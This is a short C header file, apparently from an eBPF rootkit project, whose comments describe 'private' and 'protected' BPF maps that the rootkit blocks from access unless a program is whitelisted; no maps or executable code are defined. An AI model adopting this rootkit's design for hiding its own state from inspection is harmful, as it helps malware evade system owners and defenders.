#ifndef __MAP_PROT_H
#define __MAP_PROT_H

#include "headervmlinux.h"

/*PRIVATE MAPS*/
//Any attempt to access these maps will be blocked by the rootkit
//Exclusive to bpf, see /src/bpf/defs.h


/*PROTECTED MAPS*/
//Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted

#endif